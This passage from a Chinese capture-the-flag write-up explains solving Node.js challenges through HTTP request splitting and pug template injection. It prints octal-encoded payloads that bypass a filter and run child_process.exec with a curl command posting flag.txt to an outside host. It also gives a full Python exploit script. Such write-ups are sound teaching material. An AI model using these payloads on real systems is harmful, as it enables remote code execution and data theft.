style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果上一个题仔细分析的话就会发现这个题只是代码做了一些微小的改动&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205214720894.png" alt="image-20211205214720894">&lt;/p>
&lt;p>需要多构造一个请求头，换行的CRLF和空格SP我们用unicode，而pug执行命令的部分我们可以用八进制字符&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcode&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;\143\157\156\163\164\162\165\143\164\157\162&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid,executable
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">156&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">163&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">165&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// invalid,since &amp;#34; is encoded
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>pug模板两种形式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">shellcode&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#75af00">shellcode&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>写一个外带flag的payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl 172.19.0.1:8888 -X POST -d @flag.txt&amp;#39;))&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我根据这位大佬的py2版&lt;a href="https://ctftime.org/writeup/18293">exp.py&lt;/a>写了一个py3版本的，并且改的简洁了一些（有了一些通用性，但是由于还是部分unicode编码，总体上不如全编码的稳&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 仅对字母进行编码&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;o&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;-[][&amp;#34;constructor][&amp;#34;constructor](&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl http://ip:port/ -d @/flag.txt&amp;#39;))&amp;#34;)()&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_pug&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;%22&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;%27&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># print(pug)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># print(quote(pug))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">x-forwarded-for: 127.0.0.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">adminauth: secretpassword
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">pug: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pug&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">test: &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地复现成功&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206192539624.png" alt="image-20211206192539624">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206191832996.png" alt="image-20211206191832996">&lt;/p>
&lt;h2 id="gyctf2020node-game">[GYCTF2020]Node Game&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">morgan&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;morgan&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">multer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;multer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">multer&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">dest&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;./dist&amp;#39;&lt;/span>&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">morgan&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;short&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// 简化版日志
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/template&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template&amp;#39;&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
